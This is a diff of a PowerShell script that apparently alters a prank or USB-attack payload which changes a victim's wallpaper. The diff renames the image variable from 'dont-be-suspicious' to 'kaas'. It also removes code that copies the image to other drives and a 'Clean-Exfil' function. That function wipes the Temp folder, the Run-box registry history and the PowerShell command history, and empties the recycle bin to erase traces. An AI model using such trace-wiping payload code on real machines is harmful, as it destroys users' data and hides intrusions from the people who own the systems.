@@ -34,7 +34,7 @@ $hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed t
 
 # this will be the name of the image you use as the wallpaper
 
-$ImageName = "dont-be-suspicious"
+$ImageName = "kaas"
 
 #############################################################################################################################################
 
@@ -293,37 +293,6 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 #----------------------------------------------------------------------------------------------------
 
  
-# Change the working directory to the Desktop
-Set-Location -Path "$env:USERPROFILE\Desktop"
-
-# Copy the file to D:\
-Copy-Item -Path "dont-be-suspicious.jpg" -Destination "D:\" -Force
-
-# Copy the file to E:\
-Copy-Item -Path "dont-be-suspicious.jpg" -Destination "E:\" -Force
-
-# Delete the file from the Desktop
-Remove-Item -Path "dont-be-suspicious.jpg" -Force
-
-
-# Function to clean up
-function Clean-Exfil {
-    # Delete contents of Temp folder
-    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
-
-    # Delete run box history
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
-
-    # Delete PowerShell history (PSReadline history)
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
-
-    # Empty the recycle bin
-    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-}
-
-# Call the cleanup function
-Clean-Exfil
-
 # Change the working directory to the Desktop
 Set-Location -Path "$env:USERPROFILE\Desktop"
 
